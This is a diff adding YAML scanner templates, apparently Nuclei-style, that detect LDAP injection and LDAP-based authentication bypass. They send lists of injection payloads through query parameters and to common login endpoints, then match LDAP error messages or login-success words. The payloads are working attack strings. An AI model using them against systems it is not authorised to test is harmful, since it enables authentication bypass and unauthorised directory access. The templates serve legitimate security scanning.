@@ -1,0 +1,112 @@
+id: ldap-injection
+
+info:
+  name: LDAP Injection
+  author: ancarna
+  severity: high
+  description: Detects LDAP injection vulnerabilities in authentication and search functions
+  tags: ldap,injection,authentication,owasp-top10
+  classification:
+    cwe-id: 90
+  reference:
+    - https://owasp.org/www-community/attacks/LDAP_Injection
+    - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Authentication bypass
+        - "*"
+        - "*)(&"
+        - "*)(uid=*))(|(uid=*"
+        - "*))(|(password=*"
+        - "*))%00"
+        - "admin)(&)"
+        - "admin)(|(password=*))"
+        - "x)(|(objectClass=*)"
+        # Filter manipulation
+        - ")(cn=*"
+        - "*)(cn=*))(|(cn=*"
+        - "admin*)((|userPassword=*)"
+        - "*)(objectClass=user))(|(cn=*"
+        # Boolean logic injection
+        - "*()|%26'"
+        - "*)|&'"
+        - "*)(|(cn=*"
+        - "admin)(!(&(1=0"
+        # Null byte injection
+        - "admin%00"
+        - "*%00"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Invalid DN syntax"
+          - "LDAP error"
+          - "ldap_search"
+          - "ldap_bind"
+          - "Bad search filter"
+          - "javax.naming.directory"
+          - "javax.naming.NamingException"
+          - "LDAPException"
+          - "com.sun.jndi.ldap"
+        case-insensitive: true
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)ldap[_\\s-]*(error|exception|syntax)"
+          - "(?i)invalid.*(filter|dn|attribute)"
+
+---
+id: ldap-injection-auth-bypass
+
+info:
+  name: LDAP Injection - Authentication Bypass
+  author: ancarna
+  severity: critical
+  description: Detects LDAP injection that bypasses authentication
+  tags: ldap,injection,auth-bypass
+  classification:
+    cwe-id: 90
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/auth"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username={{payload}}&password=anything"
+    payloads:
+      payload:
+        - "*)(uid=*))("
+        - "admin)(&)"
+        - "admin)(|(password=*))"
+        - "*))%00"
+        - "admin%00"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+      - type: word
+        part: body
+        words:
+          - "welcome"
+          - "dashboard"
+          - "logged in"
+          - "success"
+          - "authenticated"
+        case-insensitive: true
+        condition: or
